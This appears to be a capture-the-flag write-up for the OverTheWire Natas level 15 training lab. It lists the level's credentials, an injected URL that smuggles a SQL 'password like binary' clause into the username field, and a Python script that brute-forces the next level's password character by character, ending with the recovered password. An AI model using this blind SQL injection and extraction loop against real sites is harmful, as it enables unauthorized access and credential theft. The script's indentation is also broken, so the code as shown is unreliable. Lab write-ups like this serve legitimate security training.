# [natas 15](http://natas15.natas.labs.overthewire.org)

    Username: natas15
    Password: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

We can browse to the url below to guess the password.

    http://natas15.natas.labs.overthewire.org/?username=natas16" and password like binary"W%&debug

Write a python script to complete the work.

    import requests
    chars = [chr(i) for i in range(ord("a"),ord("z")+1)] +\
            [chr(i) for i in range(ord("A"),ord("Z")+1)] +\
            [chr(i) for i in range(ord("0"),ord("9")+1)]
    password = ''
    for i in range(64):
        for ch in chars:
        if 'This user exists' in requests.get('http://natas15.natas.labs.overthewire.org/?username=natas16" and password like binary"'+password+ch+'%&debug', auth=('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')).text:
            password += ch
            print(password)
            break
        else:
            break

Eventualy we get the password for natas 16.

    WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

